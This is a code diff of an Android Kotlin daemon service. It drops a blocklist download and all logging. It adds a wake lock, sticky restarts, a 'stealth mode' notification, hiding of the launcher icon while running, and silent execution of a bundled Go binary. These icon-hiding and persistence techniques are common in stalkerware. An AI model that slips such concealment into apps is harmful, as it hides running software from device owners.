@@ -1,94 +1,124 @@
 package com.inddev.daemon
 
+import android.app.NotificationChannel
+import android.app.NotificationManager
 import android.app.Service
+import android.content.ComponentName
+import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
 import android.os.IBinder
-import android.util.Log
+import android.os.PowerManager
+import androidx.core.app.NotificationCompat
 import java.io.File
-import java.net.URL
+import kotlin.concurrent.thread
 
 class DaemonService : Service() {
-    private var process: Process? = null
-    private val TAG = "IndDevDaemon"
+
+    private var wakeLock: PowerManager.WakeLock? = null
+    private var goProcess: Process? = null
+    private var isRunning = false
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.i(TAG, "Inisialisasi Daemon Service...")
+        if (!isRunning) {
+            isRunning = true
+            startForegroundServiceWithNotification()
+            acquireWakeLock()
+            setAppIconVisibility(visible = false) // UNGU: Sembunyikan ikon launcher saat daemon aktif
+            startGolangDaemon()
+        }
+        return START_STICKY // KUNING: Minta OS bangkitkan ulang service jika di-kill sistem
+    }
 
-        val workingDir = applicationContext.filesDir
+    private fun startForegroundServiceWithNotification() {
+        val channelId = "daemon_service_channel"
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val channel = NotificationChannel(
+                channelId,
+                "IndDev Background Daemon",
+                NotificationManager.IMPORTANCE_LOW
+            )
+            getSystemService(NotificationManager::class.java)?.createNotificationChannel(channel)
+        }
 
-        Thread {
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle("IndDev Daemon Active")
+            .setContentText("Golangbin system is running in stealth mode...")
+            .setSmallIcon(android.R.drawable.stat_notify_sync)
+            .setOngoing(true)
+            .build()
+
+        startForeground(1001, notification)
+    }
+
+    private fun acquireWakeLock() {
+        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+        wakeLock = powerManager.newWakeLock(
+            PowerManager.PARTIAL_WAKE_LOCK,
+            "IndDevDaemon::SystemWakeLock"
+        ).apply {
+            acquire()
+        }
+    }
+
+    private fun startGolangDaemon() {
+        thread {
             try {
-                // Buat folder blocklists sejajar dengan bin
-                val blocklistDir = File(workingDir, "blocklists")
-                if (!blocklistDir.exists() || blocklistDir.list().isNullOrEmpty()) {
-                    blocklistDir.mkdirs()
-                    Log.i(TAG, "Folder blocklists kosong. Mengunduh data dari repo GitHub...")
-                    
-                    // Daftar file blocklist utama yang ada di repo GitHub lu
-                    val filesToDownload = listOf(
-                        "adaway.txt", "adguarddns.txt", "blocklist-ads.txt",
-                        "blocklist-malware.txt", "blocklist-tracking.txt",
-                        "easylist.txt", "easyprivacy.txt", "hagezi-pro.txt",
-                        "ip-google.txt", "ip-telegram.txt", "reject-list.txt",
-                        "stevenblack.txt", "v2fly-ads.txt", "v2fly-google.txt", "v2fly-telegram.txt"
-                    )
+                val homeDir = File("/data/data/$packageName/files/home")
+                if (!homeDir.exists()) homeDir.mkdirs()
 
-                    val baseUrl = "https://raw.githubusercontent.com/IndogaroDevOps-SyS/blocklists/main/"
-
-                    for (fileName in filesToDownload) {
-                        try {
-                            val targetFile = File(blocklistDir, fileName)
-                            val fileUrl = URL("$baseUrl$fileName")
-                            Log.i(TAG, "Mengunduh $fileName...")
-                            fileUrl.openStream().use { input ->
-                                targetFile.outputStream().use { output ->
-                                    input.copyTo(output)
-                                }
-                            }
-                        } catch (e: Exception) {
-                            Log.w(TAG, "Gagal mendownload $fileName: ${e.localizedMessage}")
-                        }
-                    }
-                    Log.i(TAG, "Semua file blocklist berhasil diunduh ke direktori lokal.")
-                }
-
-                // Ekstrak binary Go dari assets jika belum ada
                 val binaryFile = AssetExtractor.extractAssetsIfNeeded(this)
 
-                // Eksekusi binary Go daemon
-                val pb = ProcessBuilder(binaryFile.absolutePath, "-config", "config.yaml")
-                    .directory(workingDir)
+                val pb = ProcessBuilder(binaryFile.absolutePath)
+                    .directory(homeDir)
                     .redirectErrorStream(true)
 
                 val env = pb.environment()
-                env["HOME"] = workingDir.absolutePath
-                env["TMPDIR"] = workingDir.absolutePath
+                env["HOME"] = homeDir.absolutePath
+                env["TMPDIR"] = homeDir.absolutePath
 
-                process = pb.start()
-                Log.i(TAG, "Binary Go daemon berhasil berjalan.")
+                goProcess = pb.start()
 
-                process?.inputStream?.bufferedReader()?.use { reader ->
+                // Stream log
+                goProcess?.inputStream?.bufferedReader()?.use { reader ->
                     var line: String?
                     while (reader.readLine().also { line = it } != null) {
-                        Log.d(TAG, "[Go-Core] $line")
+                        // Operational log
                     }
                 }
 
-                val exitCode = process?.waitFor()
-                Log.w(TAG, "Proses Go berhenti dengan exit code: $exitCode")
-
+                goProcess?.waitFor()
             } catch (e: Exception) {
-                Log.e(TAG, "Gagal menjalankan daemon: ${e.localizedMessage}", e)
+                e.printStackTrace()
+            } finally {
+                stopSelf() // Jika binary crash/berhenti, matikan service agar icon dimunculkan kembali
             }
-        }.start()
+        }
+    }
 
-        return START_STICKY
+    private fun setAppIconVisibility(visible: Boolean) {
+        val componentName = ComponentName(this, MainActivity::class.java)
+        val newState = if (visible) {
+            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
+        } else {
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+        }
+        packageManager.setComponentEnabledSetting(
+            componentName,
+            newState,
+            PackageManager.DONT_KILL_APP
+        )
     }
 
     override fun onDestroy() {
+        goProcess?.destroy()
+        wakeLock?.let {
+            if (it.isHeld) it.release()
+        }
+        setAppIconVisibility(visible = true) // UNGU: Kembalikan ikon launcher jika daemon mati
+        isRunning = false
         super.onDestroy()
-        process?.destroy()
-        Log.i(TAG, "Daemon Service dihentikan.")
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
